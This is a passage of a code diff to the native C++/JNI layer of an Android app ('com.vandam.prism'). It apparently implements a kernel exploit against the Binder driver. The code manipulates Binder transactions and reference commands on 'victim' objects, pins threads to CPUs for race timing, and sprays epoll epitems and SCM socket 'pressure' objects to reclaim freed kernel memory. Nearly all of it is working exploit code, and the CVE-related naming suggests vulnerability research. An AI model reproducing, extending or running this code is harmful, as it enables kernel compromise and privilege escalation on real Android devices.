+        int loader_request = g_action_loader_request.load(
+                std::memory_order_acquire);
+        if (action == 2 && loader_request == 1) {
             CommandRootIdentity loader_identity;
             bool loader_identity_valid =
                     read_command_root_identity(&loader_identity) &&
@@ -7958,10 +8326,15 @@ bool reply_raw_export(int fd, int index) {
 }
 
 bool process_raw_controlled_victim(int fd, const std::string& directory,
-                                   int victim, bool indexed) {
+                                   int victim, bool indexed,
+                                   int boundary_signal_fd = -1) {
     std::string suffix = indexed ? "." + std::to_string(victim) : "";
-    write_text_file(directory + "/raw-target.reading" + suffix,
+    bool reading_ready = write_text_file(
+            directory + "/raw-target.reading" + suffix,
             "status=ready polling=1 timeout_ms=20000");
+    bool read_go = reading_ready && (!indexed || victim != 0 ||
+            wait_for_file_byte_fast(
+                    directory + "/controlled-read.go.0", '1', 50000));
     binder_uintptr_t controlled_buffer = 0;
     std::uint64_t controlled_ptr = 0;
     std::uint64_t controlled_cookie = 0;
@@ -7982,7 +8355,148 @@ bool process_raw_controlled_victim(int fd, const std::string& directory,
     std::uint64_t last_ref_ptr = 0;
     std::uint64_t last_ref_cookie = 0;
     bool controlled_seen = false;
+    bool victim_boundary = !indexed || victim != 0;
+    if (read_go && indexed && victim == 0) {
+        pollfd descriptor {fd, POLLIN, 0};
+        int poll_result = poll(&descriptor, 1, 1000);
+        std::uint8_t boundary_buffer[128] {};
+        binder_write_read request {};
+        request.read_size = sizeof(boundary_buffer);
+        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
+                boundary_buffer);
+        bool boundary_read = poll_result == 1 &&
+                (descriptor.revents & POLLIN) != 0 &&
+                ioctl(fd, BINDER_WRITE_READ, &request) == 0;
+        int boundary_responses = 0;
+        std::uint32_t boundary_commands[5] {};
+        binder_ptr_cookie boundary_references[4] {};
+        int boundary_reference_count = 0;
+        if (boundary_read) {
+            ++read_calls;
+            for (std::size_t offset = 0;
+                 offset + sizeof(std::uint32_t) <=
+                         request.read_consumed;) {
+                std::uint32_t response = 0;
+                std::memcpy(&response, boundary_buffer + offset,
+                            sizeof(response));
+                last_response = response;
+                ++responses;
+                if (boundary_responses < 5) {
+                    boundary_commands[boundary_responses] = response;
+                }
+                ++boundary_responses;
+                if (response_order_count < 8) {
+                    response_order[response_order_count] = response;
+                    response_reads[response_order_count] = read_calls;
+                    ++response_order_count;
+                }
+                offset += sizeof(response);
+                std::size_t payload_size = _IOC_SIZE(response);
+                if (offset + payload_size > request.read_consumed) {
+                    boundary_read = false;
+                    break;
+                }
+                if ((response == BR_INCREFS ||
+                     response == BR_ACQUIRE) &&
+                    payload_size >= sizeof(binder_ptr_cookie) &&
+                    boundary_reference_count < 4) {
+                    binder_ptr_cookie reference {};
+                    std::memcpy(&reference, boundary_buffer + offset,
+                                sizeof(reference));
+                    boundary_references[boundary_reference_count++] =
+                            reference;
+                    refs_before_transaction |= response == BR_ACQUIRE
+                            ? 4 : 8;
+                    last_ref_ptr = reference.ptr;
+                    last_ref_cookie = reference.cookie;
+                }
+                offset += payload_size;
+            }
+        }
+        bool command_shape = boundary_read && boundary_responses == 5 &&
+                boundary_reference_count == 4 &&
+                boundary_commands[0] == BR_NOOP &&
+                boundary_commands[1] == BR_INCREFS &&
+                boundary_commands[2] == BR_ACQUIRE &&
+                boundary_commands[3] == BR_INCREFS &&
+                boundary_commands[4] == BR_ACQUIRE &&
+                boundary_references[0].ptr ==
+                        boundary_references[1].ptr &&
+                boundary_references[0].cookie ==
+                        boundary_references[1].cookie &&
+                boundary_references[2].ptr ==
+                        boundary_references[3].ptr &&
+                boundary_references[2].cookie ==
+                        boundary_references[3].cookie;
+        std::uint64_t boundary_ptr = boundary_references[0].ptr;
+        std::uint64_t boundary_cookie = boundary_references[0].cookie;
+        int boundary_worker = static_cast<int>(
+                boundary_ptr & kFakeControlIndexMask);
+        bool early_reclaim = command_shape &&
+                (boundary_ptr & ~kFakeControlIndexMask) ==
+                        kIndexedPtrBase &&
+                (boundary_cookie & ~kFakeControlIndexMask) ==
+                        kIndexedCookieBase &&
+                static_cast<int>(boundary_cookie &
+                        kFakeControlIndexMask) == boundary_worker &&
+                boundary_worker >= 0 &&
+                boundary_worker < kFakeControlInitialStagedCount;
+        std::uint64_t tail_ptr = reinterpret_cast<std::uint64_t>(
+                &g_raw_cohort_binder_tokens[kRawCohortVictim + 1]);
+        std::uint64_t tail_cookie = reinterpret_cast<std::uint64_t>(
+                &g_raw_cohort_cookie_tokens[kRawCohortVictim + 1]);
+        std::uint64_t next_tail_ptr = reinterpret_cast<std::uint64_t>(
+                &g_raw_cohort_binder_tokens[kRawCohortVictim + 2]);
+        std::uint64_t next_tail_cookie = reinterpret_cast<std::uint64_t>(
+                &g_raw_cohort_cookie_tokens[kRawCohortVictim + 2]);
+        bool victim_released = command_shape &&
+                boundary_ptr == tail_ptr &&
+                boundary_cookie == tail_cookie &&
+                boundary_references[2].ptr == next_tail_ptr &&
+                boundary_references[2].cookie == next_tail_cookie;
+        early_reclaim = early_reclaim &&
+                boundary_references[2].ptr == tail_ptr &&
+                boundary_references[2].cookie == tail_cookie;
+        std::uint64_t boundary_signal_value = 1;
+        bool boundary_signaled = (early_reclaim || victim_released) &&
+                boundary_signal_fd >= 0 &&
+                write(boundary_signal_fd, &boundary_signal_value,
+                        sizeof(boundary_signal_value)) ==
+                        sizeof(boundary_signal_value);
+        if (boundary_signal_fd >= 0) {
+            close(boundary_signal_fd);
+            boundary_signal_fd = -1;
+        }
+        int cpu_before = sched_getcpu();
+        int migration_errno = 0;
+        int cpu_after = -1;
+        bool migrated = boundary_signaled &&
+                pin_current_thread_to_cpu(
+                        1, &migration_errno, &cpu_after);
+        char boundary_state[320];
+        std::snprintf(boundary_state, sizeof(boundary_state),
+                "status=%s stage=victim-work-drained read_calls=%d"
+                " responses=%d victim_released=%d early_reclaim=%d"
+                " signal=%d worker=%d cpu_before=%d cpu_after=%d",
+                migrated ? "ready" : "fail", read_calls,
+                boundary_responses, victim_released ? 1 : 0,
+                early_reclaim ? 1 : 0, boundary_signaled ? 1 : 0,
+                early_reclaim ? boundary_worker : -1,
+                cpu_before, cpu_after);
+        bool boundary_written = write_text_file(
+                directory + "/raw-target.victim-work.0",
+                boundary_state);
+        bool continued = migrated && boundary_written &&
+                wait_for_file_byte_fast(
+                        directory + "/controlled-read.continue.0",
+                        '1', 100000);
+        int restored_cpu = -1;
+        victim_boundary = continued && pin_current_thread_to_cpu(
+                2, nullptr, &restored_cpu) && restored_cpu == 2;
+        read_go = read_go && victim_boundary;
+    }
     for (int attempt = 0;
+         read_go &&
          attempt < 20 && controlled_buffer == 0; ++attempt) {
         pollfd descriptor {fd, POLLIN, 0};
         int poll_result = poll(&descriptor, 1, 1000);
@@ -8098,6 +8612,7 @@ bool process_raw_controlled_victim(int fd, const std::string& directory,
             " buffer=0x%" PRIx64 " ptr=0x%" PRIx64
             " cookie=0x%" PRIx64 " worker_index=%d raw_index=%d"
             " exact_payload=%d buffer_freed=0 polling=1 wait_cpu=%d"
+            " read_go=%d victim_boundary=%d"
             " read_calls=%d responses=%d transactions=%d"
             " last_response=0x%x last_code=0x%x flags=0x%x"
             " data_size=%" PRIu64 " offsets_size=%" PRIu64
@@ -8111,6 +8626,8 @@ bool process_raw_controlled_victim(int fd, const std::string& directory,
             static_cast<std::uint64_t>(controlled_buffer),
             controlled_ptr, controlled_cookie, worker, raw_index,
             exact_payload ? 1 : 0, wait_pinned ? 1 : 0,
+            read_go ? 1 : 0,
+            victim_boundary ? 1 : 0,
             read_calls, responses,
             transactions, last_response, last_code,
             last_flags, static_cast<std::uint64_t>(last_data_size),
@@ -8127,6 +8644,10 @@ bool process_raw_controlled_victim(int fd, const std::string& directory,
             response_reads[7], response_order[7]);
     write_text_file(directory + "/controlled-reader.result" + suffix,
                     state);
+    if (boundary_signal_fd >= 0) {
+        close(boundary_signal_fd);
+        boundary_signal_fd = -1;
+    }
     if (!exact_payload) {
         return false;
     }
@@ -8247,9 +8768,13 @@ bool canonical_boot_id(const std::string& value) {
 void run_raw_target_owner(std::string directory, std::string nonce,
                           std::string expected_boot_id,
                           std::uint64_t target_start_time,
-                          bool terminal_cleanup) {
+                          bool terminal_cleanup, int boundary_signal_fd) {
     const std::string target_result = directory + "/raw-target.result";
     auto finish = [&](const std::string& state) {
+        if (boundary_signal_fd >= 0) {
+            close(boundary_signal_fd);
+            boundary_signal_fd = -1;
+        }
         write_text_file(target_result, state);
         g_raw_target_armed.store(false);
     };
@@ -8399,11 +8924,14 @@ void run_raw_target_owner(std::string directory, std::string nonce,
             return;
         }
     }
-    if (!process_raw_controlled_victim(fd, directory, 0, multi)) {
+    if (!process_raw_controlled_victim(
+                fd, directory, 0, multi, boundary_signal_fd)) {
+        boundary_signal_fd = -1;
         close(fd);
         finish("status=fail stage=raw-target reason=free-timeout");
         return;
     }
+    boundary_signal_fd = -1;
     if (deferred_export && wait_for_file(
             directory + "/raw-extra-export.receivers-go", 120000)) {
         for (int slot = 0; slot < kRawVictimCount - 1; ++slot) {
@@ -8908,19 +9436,46 @@ Java_com_vandam_prism_NativeBridge_armEpitemLeakOwner(
     return JNI_TRUE;
 }
 
+extern "C" JNIEXPORT jint JNICALL
+Java_com_vandam_prism_NativeBridge_createRawTargetBoundarySignal(
+        JNIEnv*, jclass) {
+    std::lock_guard<std::mutex> lock(g_raw_target_boundary_signal_mutex);
+    if (g_raw_target_boundary_signal_fd >= 0) {
+        close(g_raw_target_boundary_signal_fd);
+    }
+    g_raw_target_boundary_signal_fd = eventfd(
+            0, EFD_CLOEXEC | EFD_NONBLOCK);
+    return g_raw_target_boundary_signal_fd;
+}
+
+extern "C" JNIEXPORT jboolean JNICALL
+Java_com_vandam_prism_NativeBridge_closeRawTargetBoundarySignal(
+        JNIEnv*, jclass) {
+    std::lock_guard<std::mutex> lock(g_raw_target_boundary_signal_mutex);
+    bool pass = g_raw_target_boundary_signal_fd < 0 ||
+            close(g_raw_target_boundary_signal_fd) == 0;
+    g_raw_target_boundary_signal_fd = -1;
+    return pass ? JNI_TRUE : JNI_FALSE;
+}
+
 extern "C" JNIEXPORT jboolean JNICALL
 Java_com_vandam_prism_NativeBridge_armRawTargetOwner(
         JNIEnv* environment, jclass, jstring directory_string,
         jstring nonce_string, jstring boot_id_string,
-        jlong target_start_time, jboolean terminal_cleanup) {
+        jlong target_start_time, jboolean terminal_cleanup,
+        jint boundary_signal_fd) {
     if (directory_string == nullptr || nonce_string == nullptr ||
         boot_id_string == nullptr || target_start_time <= 0 ||
-        g_raw_target_armed.exchange(true)) {
+        boundary_signal_fd < 0 || g_raw_target_armed.exchange(true)) {
+        if (boundary_signal_fd >= 0) {
+            close(boundary_signal_fd);
+        }
         return JNI_FALSE;
     }
     const char* characters = environment->GetStringUTFChars(
             directory_string, nullptr);
     if (characters == nullptr) {
+        close(boundary_signal_fd);
         g_raw_target_armed.store(false);
         return JNI_FALSE;
     }
@@ -8939,6 +9494,7 @@ Java_com_vandam_prism_NativeBridge_armRawTargetOwner(
             environment->ReleaseStringUTFChars(
                     boot_id_string, boot_id_characters);
         }
+        close(boundary_signal_fd);
         g_raw_target_armed.store(false);
         return JNI_FALSE;
     }
@@ -8950,13 +9506,14 @@ Java_com_vandam_prism_NativeBridge_armRawTargetOwner(
     bool terminal = terminal_cleanup == JNI_TRUE;
     if (terminal && (nonce.size() != 32 || !lower_hex_digits(nonce) ||
                      !canonical_boot_id(boot_id))) {
+        close(boundary_signal_fd);
         g_raw_target_armed.store(false);
         return JNI_FALSE;
     }
     std::thread(run_raw_target_owner, std::move(directory),
                 std::move(nonce), std::move(boot_id),
                 static_cast<std::uint64_t>(target_start_time),
-                terminal).detach();
+                terminal, boundary_signal_fd).detach();
     return JNI_TRUE;
 }
 
@@ -8968,20 +9525,32 @@ Java_com_vandam_prism_NativeBridge_cleanupOwnerFragmentBuffers(
         std::lock_guard<std::mutex> lock(g_owner_fragment_mutex);
         buffers.swap(g_owner_fragment_buffers);
     }
-    int fd = buffers.empty() ? -1 : duplicate_binder_fd();
-    int freed = 0;
-    if (fd >= 0) {
-        for (binder_uintptr_t buffer : buffers) {
-            free_buffer(fd, buffer);
-            ++freed;
-        }
-        close(fd);
+    std::set<binder_uintptr_t> unique_buffers(
+            buffers.begin(), buffers.end());
+    bool exact = buffers.size() == kFragmentCount / 2 &&
+            unique_buffers.size() == buffers.size() &&
+            unique_buffers.find(0) == unique_buffers.end();
+    int fd = exact ? duplicate_binder_fd() : -1;
+    constexpr std::size_t kCommandSize =
+            sizeof(std::uint32_t) + sizeof(binder_uintptr_t);
+    std::vector<std::uint8_t> commands(
+            exact ? buffers.size() * kCommandSize : 0);
+    for (std::size_t index = 0; index < buffers.size() && exact; ++index) {
+        write_command(commands.data() + index * kCommandSize,
+                BC_FREE_BUFFER, &buffers[index], sizeof(buffers[index]));
     }
-    char state[160];
-    bool pass = freed == kFragmentCount / 2;
+    bool written = fd >= 0 && write_binder_commands(
+            fd, commands.data(), commands.size()) == 0;
+    bool closed = fd >= 0 && close(fd) == 0;
+    int freed = written ? static_cast<int>(buffers.size()) : 0;
+    char state[224];
+    bool pass = exact && written && closed &&
+            freed == kFragmentCount / 2;
     std::snprintf(state, sizeof(state),
-            "status=%s stage=owner-fragment-cleanup freed=%d expected=%d",
-            pass ? "pass" : "fail", freed, kFragmentCount / 2);
+            "status=%s stage=owner-fragment-cleanup freed=%d expected=%d"
+            " unique=%zu batched=1 written=%d closed=%d",
+            pass ? "pass" : "fail", freed, kFragmentCount / 2,
+            unique_buffers.size(), written ? 1 : 0, closed ? 1 : 0);
     return environment->NewStringUTF(state);
 }
 
@@ -9427,6 +9996,409 @@ Java_com_vandam_prism_NativeBridge_reclaimWithEpitems(
 }
 
 extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_prepareMixedEpitemReclaim(
+        JNIEnv* environment, jclass, jstring directory_string) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    if (g_terminal_fd_retirement_gate.load(std::memory_order_acquire) ||
+            directory_string == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=mixed-epitem-prepare reason=preflight");
+    }
+    const char* characters = environment->GetStringUTFChars(
+            directory_string, nullptr);
+    if (characters == nullptr) {
+        return environment->NewStringUTF(
+                "status=fail stage=mixed-epitem-prepare reason=directory");
+    }
+    std::string directory(characters);
+    environment->ReleaseStringUTFChars(directory_string, characters);
+
+    std::string ready = read_text_file(
+            directory + "/epitem-leak.unread-ready");
+    std::size_t cpu_position = ready.find("cpu=");
+    int cpu = cpu_position == std::string::npos ? -1 :
+            std::atoi(ready.c_str() + cpu_position + 4);
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    if (cpu >= 0 && cpu < CPU_SETSIZE) {
+        CPU_SET(cpu, &set);
+    }
+    bool pinned = cpu >= 0 && cpu < CPU_SETSIZE &&
+            sched_setaffinity(0, sizeof(set), &set) == 0;
+
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    bool empty = g_epitem_fds.empty() && g_file_probe_fds.empty() &&
+            g_file_probe_epoll_fds.empty() &&
+            g_mixed_epitem_fds.empty() &&
+            g_mixed_file_probe_fds.empty() &&
+            g_mixed_file_probe_epoll_fds.empty();
+    int watched = pinned && empty
+            ? eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK) : -1;
+    if (watched >= 0) {
+        g_mixed_epitem_fds.push_back(watched);
+    }
+    for (int index = 0; watched >= 0 &&
+            index < kEpitemPreDrainCount; ++index) {
+        int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event event {};
+        event.events = EPOLLIN;
+        event.data.u64 = UINT64_C(0x5034000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (epoll_fd < 0 || epoll_ctl(
+                epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
+            if (epoll_fd >= 0) {
+                close(epoll_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(epoll_fd);
+        ++g_mixed_predrain_count;
+    }
+    bool pass = watched >= 0 &&
+            g_mixed_predrain_count == kEpitemPreDrainCount &&
+            g_mixed_pair_count == 0;
+    if (!pass) {
+        for (int descriptor : g_mixed_epitem_fds) {
+            close(descriptor);
+        }
+        for (int descriptor : g_mixed_file_probe_fds) {
+            close(descriptor);
+        }
+        for (int descriptor : g_mixed_file_probe_epoll_fds) {
+            close(descriptor);
+        }
+        g_mixed_epitem_fds.clear();
+        g_mixed_file_probe_fds.clear();
+        g_mixed_file_probe_epoll_fds.clear();
+        g_mixed_predrain_count = 0;
+        g_mixed_pair_count = 0;
+    }
+    char state[256];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-epitem-prepare cpu=%d pinned=%d"
+            " predrain=%d expected_predrain=%d pairs=%d expected_pairs=0",
+            pass ? "pass" : "fail", cpu, pinned ? 1 : 0,
+            g_mixed_predrain_count, kEpitemPreDrainCount,
+            g_mixed_pair_count);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_beginMixedEpitemReclaim(
+        JNIEnv* environment, jclass) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int watched = g_mixed_epitem_fds.empty()
+            ? -1 : g_mixed_epitem_fds.front();
+    std::vector<int> pressure_sockets;
+    int pressure_errno = 0;
+    int pressure_objects = watched >= 0 &&
+            g_mixed_predrain_count == kEpitemPreDrainCount &&
+            g_mixed_pair_count == 0
+            ? allocate_scm_pressure(
+                    &pressure_sockets, &pressure_errno, watched) : 0;
+    int pressure_fds_closed = release_scm_pressure(&pressure_sockets);
+    bool pressure_released = pressure_objects >= kScmPressureMinimum &&
+            pressure_fds_closed > 0;
+    bool pass = pressure_released && g_mixed_pair_count == 0;
+    char state[320];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-epitem-begin"
+            " pressure_objects=%d pressure_fds_closed=%d pressure_errno=%d"
+            " pairs=%d expected_pairs=0",
+            pass ? "pass" : "fail", pressure_objects,
+            pressure_fds_closed, pressure_errno,
+            g_mixed_pair_count);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_openMixedBinderWindow(
+        JNIEnv* environment, jclass, jint count) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    std::size_t first = 1 + kEpitemPreDrainCount;
+    bool valid = count > 0 && count <= kEpitemCount &&
+            g_mixed_pair_count == kEpitemCount &&
+            g_mixed_epitem_fds.size() == static_cast<std::size_t>(
+                    kEpitemPreDrainCount + kEpitemCount + 1) &&
+            g_mixed_binder_window.empty();
+    int closed = 0;
+    for (int index = 0; valid && index < count; ++index) {
+        std::size_t position = first + static_cast<std::size_t>(index);
+        int descriptor = g_mixed_epitem_fds[position];
+        if (descriptor < 0 || close(descriptor) != 0) {
+            break;
+        }
+        g_mixed_epitem_fds[position] = -1;
+        g_mixed_binder_window.push_back(position);
+        ++closed;
+    }
+    bool pass = valid && closed == count;
+    char state[160];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-binder-window requested=%d closed=%d",
+            pass ? "pass" : "fail", count, closed);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_extendMixedEpitemReclaim(
+        JNIEnv* environment, jclass, jint target_pair_count) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int watched = g_mixed_epitem_fds.empty()
+            ? -1 : g_mixed_epitem_fds.front();
+    int before = g_mixed_pair_count;
+    bool valid = watched >= 0 && target_pair_count > before &&
+            target_pair_count <= kEpitemCount;
+    for (int index = before; valid && index < target_pair_count; ++index) {
+        int shared_epoll = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event shared_event {};
+        shared_event.events = EPOLLIN;
+        shared_event.data.u64 = UINT64_C(0x5334000000000000) |
+                static_cast<std::uint32_t>(index);
+        int probe_fd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
+        int probe_epoll = probe_fd >= 0
+                ? epoll_create1(EPOLL_CLOEXEC) : -1;
+        epoll_event probe_event {};
+        probe_event.events = EPOLLIN;
+        probe_event.data.u64 = UINT64_C(0x4634000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (shared_epoll < 0 || probe_epoll < 0 ||
+                epoll_ctl(shared_epoll, EPOLL_CTL_ADD,
+                          watched, &shared_event) != 0 ||
+                epoll_ctl(probe_epoll, EPOLL_CTL_ADD,
+                          probe_fd, &probe_event) != 0) {
+            if (shared_epoll >= 0) {
+                close(shared_epoll);
+            }
+            if (probe_epoll >= 0) {
+                close(probe_epoll);
+            }
+            if (probe_fd >= 0) {
+                close(probe_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(shared_epoll);
+        g_mixed_file_probe_fds.push_back(probe_fd);
+        g_mixed_file_probe_epoll_fds.push_back(probe_epoll);
+        ++g_mixed_pair_count;
+    }
+    bool pass = valid && g_mixed_pair_count == target_pair_count;
+    char state[192];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-epitem-extend before=%d target=%d pairs=%d",
+            pass ? "pass" : "fail", before, target_pair_count,
+            g_mixed_pair_count);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_extendMixedSharedEpitemReclaim(
+        JNIEnv* environment, jclass, jint target_count) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int watched = g_mixed_epitem_fds.empty()
+            ? -1 : g_mixed_epitem_fds.front();
+    bool valid = watched >= 0 && target_count > 0 &&
+            target_count <= kMixedExtraEpitemCount &&
+            g_mixed_pair_count == kEpitemCount &&
+            g_mixed_extra_epitem_count == 0 &&
+            g_mixed_epitem_fds.size() == static_cast<std::size_t>(
+                    kEpitemPreDrainCount + kEpitemCount + 1);
+    for (int index = 0; valid && index < target_count; ++index) {
+        int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event event {};
+        event.events = EPOLLIN;
+        event.data.u64 = UINT64_C(0x5834000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (epoll_fd < 0 || epoll_ctl(
+                epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
+            if (epoll_fd >= 0) {
+                close(epoll_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(epoll_fd);
+        ++g_mixed_extra_epitem_count;
+    }
+    bool pass = valid && g_mixed_extra_epitem_count == target_count;
+    char state[192];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-shared-epitem-extend"
+            " requested=%d extra=%d",
+            pass ? "pass" : "fail", target_count,
+            g_mixed_extra_epitem_count);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_completeMixedEpitemReclaim(
+        JNIEnv* environment, jclass) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int watched = g_mixed_epitem_fds.empty()
+            ? -1 : g_mixed_epitem_fds.front();
+    int restored_window = 0;
+    for (std::size_t position : g_mixed_binder_window) {
+        int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event event {};
+        event.events = EPOLLIN;
+        event.data.u64 = UINT64_C(0x5334f00000000000) |
+                static_cast<std::uint32_t>(position);
+        if (epoll_fd < 0 || epoll_ctl(
+                epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
+            if (epoll_fd >= 0) {
+                close(epoll_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds[position] = epoll_fd;
+        ++restored_window;
+    }
+    for (int index = g_mixed_predrain_count; watched >= 0 &&
+            index < kEpitemPreDrainCount; ++index) {
+        int epoll_fd = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event event {};
+        event.events = EPOLLIN;
+        event.data.u64 = UINT64_C(0x5034000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (epoll_fd < 0 || epoll_ctl(
+                epoll_fd, EPOLL_CTL_ADD, watched, &event) != 0) {
+            if (epoll_fd >= 0) {
+                close(epoll_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(epoll_fd);
+        ++g_mixed_predrain_count;
+    }
+    for (int index = g_mixed_pair_count; watched >= 0 &&
+            index < kEpitemCount; ++index) {
+        int shared_epoll = epoll_create1(EPOLL_CLOEXEC);
+        epoll_event shared_event {};
+        shared_event.events = EPOLLIN;
+        shared_event.data.u64 = UINT64_C(0x5334000000000000) |
+                static_cast<std::uint32_t>(index);
+        int probe_fd = eventfd(0, EFD_CLOEXEC | EFD_NONBLOCK);
+        int probe_epoll = probe_fd >= 0
+                ? epoll_create1(EPOLL_CLOEXEC) : -1;
+        epoll_event probe_event {};
+        probe_event.events = EPOLLIN;
+        probe_event.data.u64 = UINT64_C(0x4634000000000000) |
+                static_cast<std::uint32_t>(index);
+        if (shared_epoll < 0 || probe_epoll < 0 ||
+                epoll_ctl(shared_epoll, EPOLL_CTL_ADD,
+                          watched, &shared_event) != 0 ||
+                epoll_ctl(probe_epoll, EPOLL_CTL_ADD,
+                          probe_fd, &probe_event) != 0) {
+            if (shared_epoll >= 0) {
+                close(shared_epoll);
+            }
+            if (probe_epoll >= 0) {
+                close(probe_epoll);
+            }
+            if (probe_fd >= 0) {
+                close(probe_fd);
+            }
+            break;
+        }
+        g_mixed_epitem_fds.push_back(shared_epoll);
+        g_mixed_file_probe_fds.push_back(probe_fd);
+        g_mixed_file_probe_epoll_fds.push_back(probe_epoll);
+        ++g_mixed_pair_count;
+    }
+    bool pass = watched >= 0 &&
+            restored_window ==
+                    static_cast<int>(g_mixed_binder_window.size()) &&
+            g_mixed_predrain_count == kEpitemPreDrainCount &&
+            g_mixed_pair_count == kEpitemCount &&
+            g_mixed_epitem_fds.size() == static_cast<std::size_t>(
+                    kEpitemPreDrainCount + kEpitemCount +
+                    g_mixed_extra_epitem_count + 1) &&
+            g_mixed_file_probe_fds.size() == kEpitemCount &&
+            g_mixed_file_probe_epoll_fds.size() == kEpitemCount &&
+            g_epitem_fds.empty() && g_file_probe_fds.empty() &&
+            g_file_probe_epoll_fds.empty();
+    if (pass) {
+        g_epitem_fds = std::move(g_mixed_epitem_fds);
+        g_file_probe_fds = std::move(g_mixed_file_probe_fds);
+        g_file_probe_epoll_fds =
+                std::move(g_mixed_file_probe_epoll_fds);
+    } else {
+        for (int descriptor : g_mixed_epitem_fds) {
+            close(descriptor);
+        }
+        for (int descriptor : g_mixed_file_probe_fds) {
+            close(descriptor);
+        }
+        for (int descriptor : g_mixed_file_probe_epoll_fds) {
+            close(descriptor);
+        }
+        g_mixed_epitem_fds.clear();
+        g_mixed_file_probe_fds.clear();
+        g_mixed_file_probe_epoll_fds.clear();
+    }
+    int predrain = g_mixed_predrain_count;
+    int pairs = g_mixed_pair_count;
+    int window = static_cast<int>(g_mixed_binder_window.size());
+    int extra = g_mixed_extra_epitem_count;
+    g_mixed_binder_window.clear();
+    g_mixed_predrain_count = 0;
+    g_mixed_pair_count = 0;
+    g_mixed_extra_epitem_count = 0;
+    char state[288];
+    std::snprintf(state, sizeof(state),
+            "status=%s stage=mixed-epitem-complete"
+            " predrain=%d expected_predrain=%d pairs=%d expected_pairs=%d"
+            " extra=%d window=%d restored_window=%d retained=%d",
+            pass ? "pass" : "fail", predrain, kEpitemPreDrainCount,
+            pairs, kEpitemCount, extra, window, restored_window,
+            pass ? 1 : 0);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
+Java_com_vandam_prism_NativeBridge_discardMixedEpitemReclaim(
+        JNIEnv* environment, jclass) {
+    std::lock_guard<std::mutex> producer_lock(
+            g_terminal_resource_producer_mutex);
+    std::lock_guard<std::mutex> lock(g_epitem_mutex);
+    int descriptors = static_cast<int>(g_mixed_epitem_fds.size() +
+            g_mixed_file_probe_fds.size() +
+            g_mixed_file_probe_epoll_fds.size());
+    for (int descriptor : g_mixed_epitem_fds) {
+        close(descriptor);
+    }
+    for (int descriptor : g_mixed_file_probe_fds) {
+        close(descriptor);
+    }
+    for (int descriptor : g_mixed_file_probe_epoll_fds) {
+        close(descriptor);
+    }
+    g_mixed_epitem_fds.clear();
+    g_mixed_file_probe_fds.clear();
+    g_mixed_file_probe_epoll_fds.clear();
+    g_mixed_predrain_count = 0;
+    g_mixed_pair_count = 0;
+    g_mixed_extra_epitem_count = 0;
+    g_mixed_binder_window.clear();
+    char state[128];
+    std::snprintf(state, sizeof(state),
+            "status=pass stage=mixed-epitem-discard descriptors=%d",
+            descriptors);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
 Java_com_vandam_prism_NativeBridge_decrementNodeBatch(
         JNIEnv* environment, jclass, jstring directory_string) {
     if (directory_string == nullptr) {
@@ -9514,6 +10486,122 @@ Java_com_vandam_prism_NativeBridge_decrementNodeBatch(
             pass ? "pass" : "fail", tokens.size(), unique.size(), submitted,
             decrement_transactions, kDisclosureCveBatchSize,
             cpu, pinned ? 1 : 0, decrement_notified ? 1 : 0,
+            predrain_released ? 1 : 0, pressure_objects,
+            pressure_fds_closed, pressure_errno);
+    return environment->NewStringUTF(state);
+}
+
+extern "C" JNIEXPORT jstring JNICALL
